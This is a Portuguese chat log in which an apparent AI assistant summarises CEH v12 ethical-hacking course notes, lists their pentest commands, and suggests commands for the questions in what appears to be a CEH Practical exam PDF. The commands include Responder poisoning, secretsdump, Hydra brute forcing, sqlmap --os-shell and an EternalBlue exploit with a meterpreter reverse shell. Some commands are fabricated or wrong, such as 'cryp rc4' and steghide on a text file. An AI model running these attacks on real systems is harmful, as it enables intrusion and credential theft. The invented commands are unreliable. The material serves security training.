Resumo CEH v12 Treimanemto


escreva em portugues
Claro! Aqui está um resumo do seu documento:

Seu documento descreve um curso de treinamento (CEHV12) para hacking ético, incluindo:

Detalhes importantes como instrutor, datas e centro de treinamento.

Passos para fazer o download e armazenar o certificado após a conclusão.

Instruções de preparação para o laboratório de pentest, incluindo configuração de VPN.

Vários comandos e ferramentas usadas em pentest (por exemplo, Python, ferramentas de OSINT, configuração de conexão, métodos de varredura).

Técnicas para enumeração, exploração e escalada de privilégios em diferentes plataformas (por exemplo, Windows, Linux).

Seções sobre diferentes módulos, como Segurança de Aplicações Web, Injeção de SQL, Wireless, Mobile e Cloud.

Instruções para usar ferramentas como Metasploit, Nmap, Hydra, Aircrack-ng e outras.

O documento fornece instruções detalhadas de linha de comando e links para recursos.

Precisa de alguma parte específica explicada ou de alguma outra assistência com esse conteúdo?

quero separadamente uso das ferramentes de acordo com o texto
Claro! Aqui está a lista separada das ferramentas e seus usos, conforme mencionado no texto:

Ferramentas OSINT:
searx.space: Ferramenta de busca para informações de código aberto.

Preparação para Pentest:
Python:

Compilação para 32bits: apt-get install gcc-multilib g++-multilib

Invocar bash via Python: python -c 'import pty;pty.spawn("/bin/bash");'

Servidor web em Python: python3 -m http.server 80

Conexão ao LabPentest:
VPN: Usar openvpn para conectar ao arquivo connection.ovpn fornecido por email.

Configuração de Teclado e Cheatsheets:
Configuração de teclado: setxkbmap -model abnt2 -layout br

Cheatsheet via linha de comando:

Alias: alias cht='f(){ curl -skL http://cheat.sh/"$@"; unset -f f; }; f'

Exemplos: cht nmap, cht steghide, cht find, cht tcpdump

Ferramentas de Clonagem e Uso:
ctfr:

Clonagem: git clone https://github.com/UnaPibaGeek/ctfr.git

Instalação: pip3 install -r requirements.txt

Uso: python3 ctfr.py -d pimpao.com.br

dnsdumpster e crt.sh: Ferramentas para levantamento de subdomínios.

Ferramentas de Enumeração:
theHarvester:

Busca no LinkedIn: theHarvester -d eccouncil -l 200 -b linkedin

Netcraft:

Levantamento de sistema operacional: sitereport.netcraft.com

Shodan:

Mapeamento de dispositivos: shodan.io

CEWL:

Gerar dicionários: cewl -d 2 -m 5 www.certifiedhacker.com -u "Firefox 5.1" -w /tmp/dicionario.txt

Ferramentas Recon-ng:
Recon-ng:

Criação de workspaces e módulos:

bash
recon-ng
workspaces create CEH
modules load recon/domains-hosts/brute_hosts
Scanning e Enumeração de Rede:
hping3:

Scanning e XMAS: hping3 -S -p 80 192.168.10.101

Nmap:

SNMP: nmap -sU -p 161 192.168.10.103 --script=snmp-win32-users.nse

Exploração e Privilege Escalation:
Metasploit:

Uso do exploit ms17-010:

bash
search ms17-010
use 2
set rhosts 10.10.10.7
set payload windows/x64/meterpreter/reverse_tcp
exploit
Impacket:

Uso do secretsdump: impacket-secretsdump.py -just-dc CEH/SERVER2016$@10.10.10.16

Ferramentas de Invasão de Sistema:
Responder:

Captura por envenenamento: responder -I eth0

Hydra:

Quebra de senha: hydra -v -V -l eder -P dicionario.txt -t 4 ssh://192.168.10.113

Ferramentas de Wireless:
Aircrack-ng:

Quebra de senha de handshake: aircrack-ng -w dicionario.txt pacotescapturados.pcap

Crunch:

Gerar dicionário em memória: crunch 8 8 0123456789 | aircrack-ng -t -h -b macaddressaccesspoint pacotescapturados.cap -w -

Ferramentas de Mobile:
Phonesploit:

Conectar via ADB e capturar screenshots.

Ferramentas de Cloud:
AWS CLI:

Instalação e configuração:

bash
pip3 install awscli
aws configure
S3Scanner:

Procurar e fazer dump de buckets:

bash
cd /opt/S3Scanner
python3 s3scanner.py sites.txt -d
Essas são as ferramentas listadas e o uso conforme o conteúdo do seu documento. Precisa de mais alguma coisa?

crie em um arquivo so pra eu baixar tem como?
Claro! Acabei de criar um arquivo com a lista das ferramentas e seus usos conforme o conteúdo do seu documento. Você pode baixá-lo clicando no link abaixo:

Baixar Ferramentas_e_Usos.txt

774103561-CEH-Practical-1.pdf

PDF

Quais ferramente e como eu usaria elas para responder essas perguntas
Para responder às perguntas do arquivo, você pode usar várias ferramentas e técnicas de hacking ético. Aqui estão algumas ferramentas específicas e instruções sobre como usá-las para cada pergunta mencionada:

Blind SQL Injection: Use sqlmap para automatizar a detecção de SQL Injection e obter informações sobre o sistema operacional.

bash
sqlmap -u "URL_DO_SITE" --dbms=mysql --os-shell
Enumeração de Usuários de Domínio: Utilize net user e net group para listar usuários e grupos no domínio.

bash
net user
net group /domain
Varredura de Portas RDP: Utilize Nmap para identificar portas abertas e serviços.

bash
nmap -p 3389 --open 172.16.0.0/24
Descriptografia DES (ECB): Use openssl para descriptografar arquivos usando o algoritmo DES.

bash
openssl enc -d -des-ecb -in Cry-DES-FTP-IP.hex -out decrypted.txt
Esteganografia: Utilize steghide para extrair dados ocultos em arquivos.

bash
steghide extract -sf Confidential.txt -p test
Banco de Dados WordPress: Utilize WPScan para enumerar usuários e obter senhas.

bash
wpscan --url http://172.16.0.27:8080/CEH --enumerate u
Quebra de Hash MD5: Utilize hashcat para quebrar hashes MD5.

bash
hashcat -m 0 -a 0 hash.txt wordlist.txt
Backdoor e Recuperação de Arquivos: Utilize Metasploit para explorar backdoors e obter arquivos.

bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 172.16.0.27
exploit
Análise de Pacotes de Rede: Utilize Wireshark para analisar arquivos de captura de pacotes (pcapng).

bash
wireshark Dos.pcapng
Análise de Ataque DDoS: Utilize Wireshark para identificar o número de máquinas que participaram do ataque.

bash
wireshark DDoS.pcapng
Quebra de Credenciais FTP: Utilize Hydra para força bruta em servidores FTP.

bash
hydra -l username -P password_list.txt ftp://172.16.0.27
Conexão RDP: Utilize rdesktop para acessar o servidor Windows remotamente.

bash
rdesktop -u Administrator -p shadow123 172.16.0.27
Ataque SQLi: Utilize sqlmap para testar vulnerabilidades SQL.

bash
sqlmap -u "http://www.moviescope.com" --cookie="SESSAO"
Análise de Tráfego em Texto Plano: Utilize Wireshark para capturar e analisar tráfego HTTP.

bash
wireshark moviescope.com.pcapng
Teste de Método HTTP: Utilize OWASP ZAP para testar diferentes métodos HTTP.

bash
OWASP ZAP
Verificação de Integridade de Arquivos: Utilize md5sum para comparar hashes de arquivos.

bash
md5sum original_file tampered_file
Descriptografia VeraCrypt: Utilize VeraCrypt para montar volumes criptografados e acessar arquivos.

bash
veracrypt --mount secret
Descriptografia RC4: Utilize CrypTool para descriptografar arquivos RC4.

bash
cryp rc4 -in Cry-Rc4-Accountno.hex -out decrypted.txt -key 14
Acesso ao Android: Utilize ADB (Android Debug Bridge) para acessar e manipular arquivos em dispositivos Android.

bash
adb shell
Decodificação de Dados: Utilize base64 ou outras ferramentas de decodificação conforme necessário.

bash
echo "conteúdo codificado" | base64 --decode
Estas são as ferramentas e técnicas que você pode usar para resolver cada uma das questões mencionadas. Se precisar de mais detalhes sobre qualquer ferramenta ou instrução específica, estou aqui para ajudar!

